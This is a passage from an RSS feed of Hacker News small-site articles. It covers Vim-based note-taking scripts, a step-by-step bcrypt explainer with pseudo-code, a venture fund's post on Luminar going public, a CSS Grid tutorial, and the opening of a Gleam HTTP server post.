<a href="https://zettelkasten.de/">zettelkasten.de</a> and/or web search for it. There are many good
resources. What I described above is only a simplification.</p>

<h2 id="let-s-get-started">Let’s get started!</h2>

<p>Ok, so now we have a methodology and Vim without any specific notes/wiki
plugins. What do we do now? Let’s work out the workflows involved. So we want:</p>

<ul>
<li>Easy creation of new notes. It should be frictionless to create and start
editing a new note at any time. More friction equals less motivation to write
up a note.</li>
<li>Powerful options for search. Zettelkasten eschews hierarchy and taxonomy in
favour of flexible search and…</li>
<li>Linking between notes. We need to be able to create a network of small notes,
where we can search to find an entry point, and then traverse notes to
discover related ideas.</li>
</ul>

<h3 id="creating-notes">Creating notes</h3>

<p>Obviously I’ll be editing a new note in Vim. There are two main places from
where I want to be able to create a note: the shell and Vim itself. It must be
as frictionless as possible to create new notes; any friction will dissuade me
from taking a note at once, and thoughts are fleeting.</p>

<p>So, from inside Vim, I have a command and function to create a timestamped file
in my notes directory:</p>

<pre><code>" .vim/plugin/local.vim
command! -nargs=* Zet call local#zettel#edit(&lt;f-args&gt;)
</code></pre>

<pre><code>" .vim/autoload/local/zettel.vim
func! local#zettel#edit(...)

  " build the file name
  let l:sep = ''
  if len(a:000) &gt; 0
    let l:sep = '-'
  endif
  let l:fname = expand('~/wiki/') . strftime("%F-%H%M") . l:sep . join(a:000, '-') . '.md'

  " edit the new file
  exec "e " . l:fname

  " enter the title and timestamp (using ultisnips) in the new file
  if len(a:000) &gt; 0
    exec "normal ggO\&lt;c-r&gt;=strftime('%Y-%m-%d %H:%M')\&lt;cr&gt; " . join(a:000) . "\&lt;cr&gt;\&lt;esc&gt;G"
  else
    exec "normal ggO\&lt;c-r&gt;=strftime('%Y-%m-%d %H:%M')\&lt;cr&gt;\&lt;cr&gt;\&lt;esc&gt;G"
  endif
endfunc
</code></pre>

<p>Now we can create a new titled, timestamped note directly in Vim: <code>:Zet a new
note</code> to edit (for example) <code>~/wiki/2019-12-21-0945-a-new-note.md</code>.</p>

<p>It’s possible to instruct Vim to execute a command on launch, so we can write a
shell function with the same api as the <code>:Zet</code> command:</p>

<pre><code>zet() {
  nvim "+Zet $*"
}
</code></pre>

<p>So, <code>$ zet a new note</code> will produce the same result as the example above from
in Vim.</p>

<p>It would be just as easy to develop entry points to creating notes from
elsewhere in the environment, but since I spend a lot of time either in Vim or
have multiple shell sessions open, most of the time a neat new note is only a
few keystrokes away.</p>

<h3 id="linking-notes">Linking notes</h3>

<p>Now we have some notes, we need to link them together.</p>

<p>Here, I stray from vanilla Vim, and lean on a couple of popular plugins:
<a href="https://github.com/SirVer/ultisnips/">Ultisnips</a> to shortcut inserting custom syntax and
<a href="https://github.com/Shougo/deoplete.nvim">Deoplete</a> to auto-complete paths to other notes.</p>

<p>Before we go into the code, let’s see what the end result looks like:</p>





<p>Now the code! I use a syntax similar to Vimwiki to denote internal links, which
are simply paths to other note files in the notes directory, with the extension
removed for readability.</p>

<pre><code>" .vim/UltiSnips/markdown.snippets
snippet h "hyperlink"
[[$1]]$0
endsnippet
</code></pre>

<p>With this snippet, and the Deoplete configuration that comes next, The
keysequence <code>h&lt;snippet-trigger&gt;</code> enters the syntax and opens a fuzzy
autocomplete for other notes. Two key strokes is my definition of low friction.
:)</p>

<p>And this is the (abridged) Deoplete source plugin to list all files in my notes directory.</p>

<pre><code># .vim/rplugin/python3/deoplete/sources/wiki_files.py
class Source(Base):
    def __init__(self, vim):
        self.name = 'wiki_files'
        self.mark = '[WL]' # WikiLink
        self.min_pattern_length = 0
        self.rank = 450
        # only activate for files in my notes directory
        self.filetypes = ['privwiki']

    def get_complete_position(self, context):
        # trigger completion if we're currently in the [[link]] syntax
        pos = context['input'].rfind('[[')
        return pos if pos &lt; 0 else pos + 2

    def gather_candidates(self, context):
        contents = []
        path = '/home/swalladge/wiki/'
        # now gather all note files, and return paths relative to the current
        # note's directory.
        cur_file_dir = dirname(self.vim.buffers[context['bufnr']].name)
        for fname in glob.iglob(path + '**/*', recursive=True):
            fname = relpath(fname, cur_file_dir)
            if fname.endswith('.md'):
                fname = fname[:-3]
            contents.append(fname)
        return contents
</code></pre>

<p>Note that we can still use Vim’s built in <code>gf</code> (goto file) mapping to follow
the link - see <a href="https://vimhelp.org/options.txt.html#%27suffixesadd%27">:h ‘suffixesadd’</a>. The more we can do in Vim
builtins, the better - it’s familiar, portable, maintained.</p>

<h3 id="search">Search</h3>

<p>Now the third and final point: searching. This is one of my favourite points as
there are so many possibilities!</p>

<p>Search is core to being able to effectively <em>consume</em> notes (as opposed to
<em>creating</em> notes, as the previous points have been mainly about). For me, there
are 3 entry points to search and 3 types of search. The following points aren’t
core to Zettelkasten, but is core for me to be able to pinpoint a certain note
quickly. YMMV.</p>

<p>By “entry points”, I mean where I want to start a search from. These are:</p>

<ol>
<li>the desktop (ie. anywhere)</li>
<li>the shell</li>
<li>Vim itself</li>
</ol>

<p>Types of search:</p>

<ol>
<li>fuzzy find by title</li>
<li>grep file contents</li>
<li>search-engine-style search</li>
</ol>

<p>Note that wherever these searches begin, and whatever methods are used, they
always end up in Vim and a way to navigate between search results in Vim.</p>

<p>Ok, so fuzzy find by title is done from the window manager with</p>

<pre><code># ~/.config/i3/config
bindsym Mod4+w exec --no-startup-id open-wiki-page
</code></pre>

<p>And the corresponding script that launches a graphical fuzzy finder which is
used to select a wiki file to open in a new terminal window:</p>

<pre><code>~/bin/open-wiki-page
cd "$HOME/wiki"

if [ -n "$WAYLAND_DISPLAY" ]; then
  file=$(rg --files --follow | bemenu --fn 'Hack 11' -p "wiki:" -i -l 20)
else
  file=$(rg --files --follow | rofi -dmenu -no-custom  -i -p "wiki")
fi

[[ -n "$file" ]] || exit

exec termite -e "nvim \"$file\""
</code></pre>

<p>Fuzzy find from inside Vim is done using <a href="https://github.com/junegunn/fzf">fzf</a> and a mapping:</p>

<pre><code>" ~/.vim/after/plugin/local.vim
map &lt;silent&gt; &lt;leader&gt;ww :FZF ~/wiki&lt;cr&gt;
</code></pre>

<p>Grepping contents of wiki files is done using Vim’s builtin <code>:grep</code> command
(I’ve set <a href="https://vimhelp.org/options.txt.html#%27grepprg%27"><code>grepprg</code></a> to <a href="https://github.com/BurntSushi/ripgrep/">rg</a> for speed).</p>

<p>A proper search engine-esque search with stemming, ranking by relevance, etc.
is done using the excellent <a href="https://github.com/tantivy-search/tantivy">Tantivy</a> search engine, plumbed together
with <a href="https://github.com/swalladge/searchr">searchr</a>, a cli program I wrote for this purpose.</p>

<pre><code># ~/.config/searchr/config.toml
[indexes.wiki]
language = "English"
index_path = "/home/swalladge/.searchr/wiki"
files = [
  '/home/swalladge/wiki/**/*.md',
]
require_literal_leading_dot = true
</code></pre>

<pre><code>" ~/.vim/plugin/local.vim
command! -nargs=* Searchr call local#searchr#search(&lt;f-args&gt;)
</code></pre>

<pre><code>" ~/.vim/autoload/local/searchr.vim
function! local#searchr#search(index, ...)
  let l:query = join(a:000, ' ')
  if a:index == "all"
    let l:which_index = '-a'
  else
    let l:which_index = '-i ' . a:index
  endif
  let l:cmd = 'searchr ' . l:which_index . " search -l 15 " . l:query . ""
  let l:files = split(system(l:cmd), "\n")
  let l:qffiles = []
  for f in l:files
    call add(l:qffiles, {'filename': f})
  endfor
  call setqflist(l:qffiles)
  copen
  cc
endfunction
</code></pre>

<h2 id="conclusion">Conclusion</h2>

<p>Vim is a powerful tool, but some of it’s power comes not because it takes over
the environment, but because it can blend seamlessly with it’s environment and
bend to fit your workflow.</p>

<hr>

<p><em>This article is licensed under the <a href="https://creativecommons.org/licenses/by/4.0/">Creative Common Attribution 4.0 International License</a>. …</em></p></article></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vimways.org/2019/personal-notetaking-in-vim/">https://vimways.org/2019/personal-notetaking-in-vim/</a></em></p>]]>
            </description>
            <link>https://vimways.org/2019/personal-notetaking-in-vim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266528</guid>
            <pubDate>Mon, 24 Aug 2020 23:08:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bcrypt Step by Step]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24266389">thread link</a>) | @lanecwagner
<br/>
August 24, 2020 | https://qvault.io/2020/08/24/bcrypt-step-by-step/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/08/24/bcrypt-step-by-step/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Bcrypt is a <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">key derivation function</a>, which can be thought of as a slow <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hash function</a>. Its purpose is to <em>slowly</em> convert a piece of input data to a fixed-size, deterministic, and unpredictable output. A common use-case is to convert a password into an n-bit cryptographic key, which can then be used for safe authentication. </p>



<p>Here at <a href="https://classroom.qvault.io/">Qvault,</a> we use Bcrypt in our security systems. Bcrypt is a very popular password hashing function, so much so that it’s the hash function we currently teach the implementation of in our <a href="https://classroom.qvault.io/">Practical Cryptography</a> course.</p>



<h2>What Bcrypt Looks Like</h2>



<p>Using Bcrypt on the password <em>myPassword123</em> would produce something like the following:</p>



<pre><strong><em>myPassword123</em> </strong>-&gt;
$2y$12$vUw4OU4EAl4w4vC6/lA33OtDSYGhiIdekdT9iOoSs9/ckwrffaEui</pre>



<p>That output can be used to compare against future hashes against to see if the original data matches.</p>



<h2>Why not compare passwords directly?</h2>



<p>In web development,<em> </em>it is insecure to store user’s passwords in plain text. If an attacker were to gain access to the server’s database they could find raw email/password combinations and use them to attack the same users on other sites. </p>



<p>At the <em>very least</em> we must hash user’s passwords, but hash functions like <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">SHA-2</a> and MD5 are too fast to be secure. Using a KDF like Bcrypt provides security benefits over fast hashes because it is computationally expensive and slow. If an attacker gains access to a database of password hashes made with fast algorithms it is easy for them to “reverse” the hashes by guessing different inputs and seeing if the outputs match.</p>



<p>For example, let’s say the attacker finds the following entry in a database:</p>



<pre>user@gmail.com 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p>They can try hashing common passwords like:</p>



<pre>password1 -&gt;
0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e
password2 -&gt;
6cf615d5bcaac778352a8f1f3360d23f02f34ec182e259897fd6ce485d7870d4
password3 -&gt; 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p><br>The password, <code>password3</code>, produced a matching hash! Now the attacker knows that <code>user@gmail.com</code> is likely to use the password <code>password3</code> on other sites and can go hack other accounts. This is only possible because the attacker is able to quickly compute many hashes per second and guess millions of potential passwords.</p>



<p>A slow KDF like Bcrypt solves this problem.</p>



<h2>Bcrypt Output Format</h2>



<pre>$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
\___/\__/\_____________________________/\___________________________________/
Alg   Cost                  Salt                                            Hash</pre>



<ul><li><code>2a</code>: The hash algorithm identifier (Bcrypt)</li><li><code>10</code>: Cost factor (2<sup><code>10</code></sup>&nbsp;= 1,024 rounds of key expansion)</li><li><code>N9qo8uLOickgx2ZMRZoMye</code>: 16-byte (128-bit) salt, base64 encoded to 22 characters</li><li><code>IjZAgcfl7p92ldGxad68LJZdL17lhWy</code>: 24-byte (192-bit) hash, base64 encoded to 31 characters</li></ul>



<p>Direct from <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bcrypt#Description" target="_blank">Wikipedia</a></p>



<h2>Bcrypt Explained Step by Step</h2>



<p>Bcrypt can be visualized with the following Go-like pseudo code:</p>



<pre><code lang="go">func bcrypt(cost int, salt [16]byte, password [72]byte) (hash string) {
	// Initialize Blowfish state with expensive key setup algorithm
	// This is the slow part of the algorithm
	pEighteenSubkeys, sFourSubBoxes := expensiveBlowfishSetup(cost, salt, password)

	// Repeatedly encrypt the text "OrpheanBeholderScryDoubt" 64 times
	// 24 bytes = three 64-bit blocks
	ctext := "OrpheanBeholderScryDoubt"
	for i := 0; i &lt; 64; i++ {
		// Encrypt using standard Blowfish in ECB mode
		ctext = encryptECB(pEighteenSubkeys, sFourSubBoxes, ctext)
	}

	// return the version, cost, salt, and ctext in the proper format
	return "$2a${cost}${salt}{ctext}"
}</code></pre>



<p>As you can see, Bcrypt depends heavily on the <a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)" rel="noopener">Blowfish</a> cipher. Put simply, Bcrypt is an expensive key expansion coupled with Blowfish encryption.</p>



<p>The <code>expensiveBlowfishSetup</code> function can be understood by following pseudo code:</p>



<pre><code lang="go">// pEighteenSubkeys: array of 18 subkeys
// sFourSubBoxes: Four substitution boxes
// Each S-Box is a 256-length array of uint32
func expensiveBlowfishSetup(cost int, salt [16]byte, password [72]byte) (pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32) {
	// Initialize arrays
	pEighteenSubkeys := [18]uint32
	sFourSubBoxes := [4][256]uint32

	// Fill pEighteenSubkeys and sFourSubBoxes with the hex digits of pi 
	// This initial state works as in the original Blowfish algorithm
	// it populates the P-array and S-box entries with the fractional part of pi in hexadecimal
	pEighteenSubkeys = fillWithPi(pEighteenSubkeys)
	sFourSubBoxes = fillWithPi(sFourSubBoxes)

	// Permutate P and S based on the password and salt
	pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, salt, password)

	// This is the "Expensive" part of the "Expensive Key Setup"
	// Otherwise the key setup would be identical to Blowfish
	// Expand the key an exponentially increasing number of times
	// depending on the cost factor
	for i := 0; i &lt; math.Pow(2, cost); i++ {
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, password)
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, salt)
	}

	return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p><code>The expandKey function</code> is executed an exponentially increasing number of times depending on the value of the <code>cost</code> parameter. The <code>expandKey</code> function is explained by the following pseudo-code:</p>



<pre><code lang="go">func expandKey(pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32, salt [16]byte, password [72]byte) (
	pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32
	) {

	// Mix password into the pEighteenSubkeys array
	// by XORing password with subkeys
	for i := 0; i &lt; 18; i++{
		// treat the password as cyclic, XOR 32 bit chunks of password with subkeys
		pEighteenSubkeys[i] ^= password[i % 18]
	}
 
   // Treat the 128-bit salt as two 64-bit halves 
   saltHalf[0] = salt[0:63]
   saltHalf[1] = salt[64:127]

   // Initialize an 8-byte (64-bit) buffer with all zeros.
   block := [8]byte

   // Mix internal state into P-boxes   
   for i := 0; i &lt; 9; i++ {
	  // XOR 64-bit block with a 64-bit salt half
	  // Each iteration alternating between saltHalf[0], and saltHalf[1]
      block ^= saltHalf[(i-1) mod 2]

	  // Encrypt block using current key schedule with blowfish block encryption
	  block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block)
	  
	  // Split block and use as new subkeys
      pEighteenSubkeys[2*i] = block[0:31]
	  pEighteenSubkeys[2*i + 1] = block[32:63]
   }

   // Mix encrypted state into the internal S-boxes of state
   for i := 0; i &lt; 4; i ++ {
      for j := 0; j &lt; 127; j++ {
		// Encrypt block using blowfish block encryption
		// where salt[i] is 64 bit chunks
        block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block ^ salt[i])
        sFourSubBoxes[2*i] = block[0:31]
		sFourSubBoxes[2*i + 1] = block[32:63]
	  }
	}
    return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p>It helps me to visualize the details of the pseudo-code by using a more “real” programming syntax like Go. If that doesn’t help you then take a look at the code on the <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Bcrypt#Algorithm" target="_blank">Wikipedia</a> page here.</p>



<div><div>
<h2>Thanks For Reading!</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>

		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/08/24/bcrypt-step-by-step/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266389</guid>
            <pubDate>Mon, 24 Aug 2020 22:46:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero to $3.4B: Luminar Goes Public]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24266382">thread link</a>) | @rafaelc
<br/>
August 24, 2020 | https://www.1517fund.com/post/luminar-goes-public | <a href="https://web.archive.org/web/*/https://www.1517fund.com/post/luminar-goes-public">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>1517 had some great news break today: one of our companies, Luminar Technologies, announced it is going public at a $3.4 billion valuation. This is a tremendous win for the company, 1517, and for all of us working to build new paths outside traditional forms of education. Luminar is going public via a SPAC which involves a merger, but by the end of this year, they will be listed on NASDAQ with the stock ticker symbol LAZR. It will mark the first company to go public for 1517 and the first Thiel Fellow to do so as well. <br></p><p>Some things are a long time in the making, but in some sense it’s hard for those early beginnings to fade away for us. It still seems like only yesterday that we were sitting at a coffee shop inside the Infinite Corridor on MIT’s campus, when Danielle turned to Michael and said, “Hey, that’s Austin and his mom!” They were taking a self-guided tour of the campus. Austin still hadn’t decided what university he might go to or whether he would pursue the more unschooled route of the Thiel Fellowship. <br></p><p>After he applied, while assessing him for a fellowship, we wondered if Austin’s ideas were crazy or crazy awesome. And truth be told, we couldn’t tell at first. But what we did know was that Austin had the attributes of the types of young people we wanted to back: hyper-fluency in a technical field, zeal in getting started on his work, and enough social-emotional intelligence to lead a team, hire employees, and work with investors. By the end of his two years in the program he was ready to start getting Luminar fully underway. <br></p><figure id="w-node-e4cb15e9654a-da90e923"><p><img src="https://uploads-ssl.webflow.com/5d9cd3e9b5891d2b0490e928/5f441af5375d6f5102a5f280_IMG_4071.JPG" loading="lazy" alt=""></p><figcaption>Michael in a Luminar electric gocart, circa 2015.</figcaption></figure><p>This company started in a nondescript warehouse in Irvine, California with a bunch of physics geeks who liked to build things with lasers. When they weren’t working on the 1.0 version of their lidar sensor, they built electric surfboards and gocarts for fun. &nbsp;<br></p><p>Now the world knows Austin wasn’t crazy -- he was crazy awesome. Luminar’s list of customers includes 50 major players in the automotive industry, including the lidar industry’s largest production series deal with Volvo to provide units to their fleet of cars in 2022 and beyond. It is both surreal and awesome in the literal sense of the word for us to be a part of this story and to see this growth over the last seven years. <br></p><p>There have been many naysayers over the years. We think of the former Treasury Secretary and former President of Harvard, Larry Summers, <a href="https://techcrunch.com/2013/10/10/thiel-fellows-program-is-most-misdirected-piece-of-philanthropy-says-larry-summers/">who said</a> that the Thiel Fellowship was “the single most misdirected bit of philanthropy this decade.” And MIT banned us from recruiting on their campus. But we didn’t listen. We started a venture capital fund dedicated to backing the sorts of people Larry Summers didn’t think could possibly exist: world-changers who never set foot on an Ivy League campus. In fact, now that we’ve seen ten thousand applications, and have worked with thousands of founders, we can state without reservation that many things the Ivy League selects for in their students are negative signals when it comes to building the future. It isn’t that these students are not smart enough. It’s that they try too hard for respectability, which is deadly to creativity. &nbsp; <br></p><p>It will have been 10 years ago next month that Peter Thiel and his colleague Jim O’Neill pulled Michael into a meeting on his first day at work and told him that we were starting an “anti-Rhodes scholarship” by paying people to drop out of college to work on science and technology. Danielle joined and quickly brought structure to that unconventional program, the Thiel Fellowship. In the following decade, we’ve been able to work with thousands of young people who don’t have degrees--or any credentials whatsoever. Luminar is but the first of the companies from that anti-Rhodes scholarship to go public. With 1517, we’re fortunate to work with many founders like Austin Russell, and there are more great companies in the pipeline. In our first fund, we’re excited to see Loom, nTopology, Fossa, Union Crate, and others continue to scale. And that doesn’t even count our Fund II, which is just underway. <br></p><p>There is over $1.6 trillion in outstanding student debt and many universities think they can charge $60k a year for lectures over Zoom. There is a bubble in higher education. 1517 is the pin. 2020 is the year the bubble pops. <br></p></div></div>]]>
            </description>
            <link>https://www.1517fund.com/post/luminar-goes-public</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266382</guid>
            <pubDate>Mon, 24 Aug 2020 22:44:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Element Positioning:(CSS Grid)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24266102">thread link</a>) | @nelsonmichael
<br/>
August 24, 2020 | https://nelsonmichael.dev/introduction-to-element-positioningcss-grid-cke92kwto00szx3s12zru6tep | <a href="https://web.archive.org/web/*/https://nelsonmichael.dev/introduction-to-element-positioningcss-grid-cke92kwto00szx3s12zru6tep">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The introduction of CSS grid was a breakthrough for webpage layout, it was a new and easy way to place elements on a webpage where ever you'd want. </p>
<p>CSS Grid is a powerful property because sides letting us easily layout a webpage, it also helps with responsive web design, allowing our webpage look good on various screen sizes.</p>
<p>By the end of this article, you would be able to layout a webpage with CSS Grid effectively, using different Grid properties.</p>
<h2 id="what-is-css-grid">What is CSS Grid?</h2>
<p>CSS Grid is a two-dimensional layout system, which means it works with rows and columns that is used to position elements on a webpage.</p>
<p>CSS Grid is activated by setting the display property of a parent element to <strong>grid</strong>, <strong>inline-grid</strong>, or <strong>subgrid</strong>.</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid inline-grid subgrid;
}
</code></pre><h2 id="grid-properties">Grid Properties</h2>
<p>We're going to be looking at two property groups, namely: 
<strong>Properties for the Parent Elements(Grid Container) and Properties for the Children Elements(Grid Items).</strong></p>
<p>In this article, we're going to be focusing on some properties from each property group, that's going to help you create beautiful and responsive page layouts.</p>
<h2 id="parent-elementsgrid-container-properties">Parent Elements(Grid Container) Properties</h2>
<ul>
<li>Display</li>
<li>Grid-template-columns (repeat, auto-fill and minmax)</li>
<li>Grid-template-rows</li>
<li>Gap</li>
</ul>
<h2 id="display">Display</h2>
<p>By setting a parent element's display property to <strong>grid</strong>, you have activated the CSS Grid system. let's look at the example below ;</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid;
}
</code></pre><h2 id="grid-template-columns">Grid-template-columns</h2>
<p>This grid property is used to define the columns of a grid system, think of this as the width of the element. The values can be lengths, percentages, or fractions. In this article, we're going to be using fractions.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>1</span>fr <span>1</span>fr <span>1</span>fr;
}
</code></pre>
<p>Let's analyze our code. We set the display property of the container to <strong>Grid</strong> which activates the CSS grid layout system and the <strong>grid-template-columns</strong> to <strong>1fr</strong>.</p>
<p>Notice how we put in <strong>1fr</strong> thrice? Well, that simply means, take a third of the container 3 times, so 1/3. Let's look at the code below;</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid;
    <span>grid-template-columns</span>: <span>1</span>fr <span>1</span>fr <span>2</span>fr;
}
</code></pre><p>In the example above, <strong>2fr</strong> is going to take twice the size of <strong>1fr</strong> whilst <strong>1fr</strong> reduces in size so that when the new size of <strong>1fr</strong> is added it gives the exact amount of the size left by <strong>2fr</strong> and they can all fit into the container. </p>
<p>Another way to set the values for the <strong>grid-template-columns</strong> is to use the <strong>repeat()</strong> value. Let's look at how this works below;</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid;
    <span>grid-template-columns</span>: <span>repeat</span>(<span>3</span>, <span>1</span>fr);
}
</code></pre><p>The above code would produce the same result, it's just a faster way to set the values. The first value specifies how many times you want to repeat and the second set the value you want to repeat.</p>
<blockquote>
<p><strong>NOTE:</strong> The fraction unit is more advisable to use when working with the grid system because it takes into account other factors like the gap between the elements in the container and then adjusts so that it can fit in properly; we'll get a better understanding of this when we get to the gap property. </p>
</blockquote>
<h2 id="grid-template-rows">Grid-template-rows</h2>
<p>The <strong>grid-template-rows</strong> property is used to define the rows of a grid system, think of this as the height of the element. The values can be lengths, percentages, or fractions.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>3</span>, <span>1</span>fr);
  <span>grid-template-rows</span>: <span>1</span>fr <span>2</span>fr;
}
</code></pre>
<h2 id="gap">Gap</h2>
<p>The <strong>gap</strong> property is used to set the space between items on a grid system, think of this as setting the margin-top, left, bottom, and right property of the item.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>3</span>, <span>1</span>fr);
  <span>grid-template-rows</span>: <span>1</span>fr <span>2</span>fr;
  <span>gap</span>: <span>10px</span>;
}
</code></pre>
<h2 id="bonus">Bonus</h2>
<p>Let's look at a common code pattern that is going to help our grid system be a lot more responsive.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>repeat</span>(auto-fill, <span>minmax</span>(<span>200px</span>, <span>1</span>fr));
  <span>grid-template-rows</span>: <span>1</span>fr <span>2</span>fr;
  <span>gap</span>: <span>10px</span>;
}
</code></pre>
<p>In the code above, we set the <strong>auto-fill</strong> value and this means the grid items would auto-fill according to the size of the viewport to fill up whatever space is left. Then we set the <strong>minmax</strong> value which specifies the minimum size of the column which is <strong>200px</strong> and the maximum to be <strong>1fr</strong></p>
<h2 id="children-elementsgrid-items-properties">Children Elements(Grid Items) Properties</h2>
<ul>
<li>grid-column</li>
<li>grid-row</li>
</ul>
<h2 id="grid-column">Grid-column</h2>
<p><strong>Grid-column</strong> is a grid item property that specifies the position of an item in a grid system on the column axis. <strong>Grid-column</strong> is a short-hand property used for specifying the <strong>grid-column-start</strong> and <strong>grid-column-end</strong> property of an item.</p>
<pre><code>.item {


    grid-column: 1 / 4 ;



   grid-column-start: 1;
   grid-column-end: 3;   
}
</code></pre>
<p>Now let's do a quick analysis of what is going on in this example so that we can have a better understanding.</p>
<p><img src="https://i.imgur.com/C6E2DI6.png" alt=""></p>
<p>When we create a grid system, there are invisible grid lines that are created that we don't see, well technically they are not invisible when you use the chrome developer tools.</p>
<p>In our example,  we set the <strong>grid-column-start</strong> of the items with the <strong>.green</strong> class to <strong>1</strong>. Now notice the green class in the image, it starts at <strong>1</strong> where the first column begins continues to <strong>2</strong> where the second column begins and then <strong>ends</strong> at <strong>3</strong></p>
<h2 id="grid-row">Grid-row</h2>
<p><strong>Grid-row</strong> is a grid item property that determines how an item in a grid system is positioned on the row axis. <strong>Grid-row</strong> is a short-hand property used for specifying the <strong>grid-row-start</strong> and <strong>grid-row-end</strong> property of an item.</p>
<pre><code>.item {


    grid-row: 1 / 4 ;



   grid-row-start: 1;
   grid-row-end: 3;   
}
</code></pre>
<p><img src="https://i.imgur.com/hRZyBIJ.png" alt=""></p>
<p>The above example follows the same principle as the <strong>grid-column</strong>, but this only affects the row axis.</p>
<h2 id="conclusion">Conclusion</h2>
<blockquote>
<p>"On October 17th, Microsoft’s Edge browser shipped its implementation of CSS Grid. This is a milestone for several reasons. First, it means that all major browsers now support this incredible layout tool. Second, it means that all major browsers rolled out their implementations in a single year(!), a terrific example of standards success and cross-browser collaboration. But third, and perhaps most interestingly, it closes the loop on a process that has been more than 20 years in the making. ~<a target="_blank" href="https://alistapart.com/article/the-story-of-css-grid-from-its-creators/">A LIST APART</a>"</p>
</blockquote>
<p>CSS Grid makes a great, easy, and responsive way to layout a webpage, by specifying simple properties we can make our webpage look beautiful and organized.</p>
<p>This brings me to the end of this article. In this part of the series, we looked at how to layout a webpage, by using the CSS Grid system. In the coming parts of the series, we're going to be looking at other ways we could layout and position elements on a webpage.</p>
<h2 id="attributions">Attributions</h2>
<ul>
<li>Zero to Mastery Academy</li>
</ul>
</div></div>]]>
            </description>
            <link>https://nelsonmichael.dev/introduction-to-element-positioningcss-grid-cke92kwto00szx3s12zru6tep</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266102</guid>
            <pubDate>Mon, 24 Aug 2020 22:08:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lean HTTP Server for Gleam]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24265936">thread link</a>) | @QuinnWilton
<br/>
August 24, 2020 | http://crowdhailer.me/2020-06-23/introducing-lean-server-for-midas/ | <a href="https://web.archive.org/web/*/http://crowdhailer.me/2020-06-23/introducing-lean-server-for-midas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        Lean server is a HTTP server written in Gleam (Gleam is a new type safe language for the Erlang virtual machine (BEAM)).
        Lean is the built-in server for the <a href="https://github.com/midas-framework/midas">Midas Web Framework</a>
      </p>
      <pre><code>
        import midas/lean.{MaxConcurrency}
        import gleam/http

        fn handle(_request) {
          http.response(200)
          |&gt; http.set_body("Hello, World!")
        }

        fn start_link() {
          lean.start_link(handle, 8080, [MaxConcurrency(100000)])
        }
      </code></pre>
      <h2>Why Lean?</h2>
      <ul>
        <li>Simple to use</li>
        <li>Simple to maintain</li>
        <li>Fast, hopefully</li>
      </ul>
      <p>
        Lean incorperates the lessons I learnt while developing <a href="https://github.com/crowdhailer/ace">Ace</a> and <a href="https://github.com/crowdhailer/raxx">Raxx</a>.
